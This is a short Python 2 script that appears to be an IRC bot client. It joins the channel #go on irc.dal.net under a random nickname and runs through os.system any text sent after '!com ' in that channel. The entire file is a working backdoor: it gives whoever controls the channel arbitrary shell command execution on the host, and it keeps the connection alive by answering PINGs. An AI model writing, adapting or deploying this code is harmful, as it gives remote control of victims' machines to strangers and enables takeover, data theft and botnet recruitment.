import socket
import os
import random
import urllib2
import time

def internet_on():
    try:
        response=urllib2.urlopen('http://google.com',timeout=2)
        return True
    except urllib2.URLError as err: pass
    return False

server = "irc.dal.net"
channel = "#go"
botnick = "" # If you want a custom nick, comment out the next two lines and put your nick here. To use a random nickname, keep this empty.

for i in range(12):
        botnick += random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789')

while 1:

	if internet_on():
		ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		ircsock.connect((server, 6667))
		ircsock.send("NICK "+ botnick +"\n")
		ircsock.send("USER " + botnick + " 8 * :My real name\n")
		ircsock.send("JOIN "+ channel +"\n")

		while 1:

  			ircmsg = ircsock.recv(2048)
  			ircmsg = ircmsg.strip('\n\r')

  			if ircmsg.find(":!com") != -1:
    				head, sep, tail = ircmsg.partition("!com ")
    				os.system(tail)
    
  			if ircmsg.find("PING :") != -1:
    				ircsock.send("PONG :Pong\n")
	else:
		time.sleep(5)
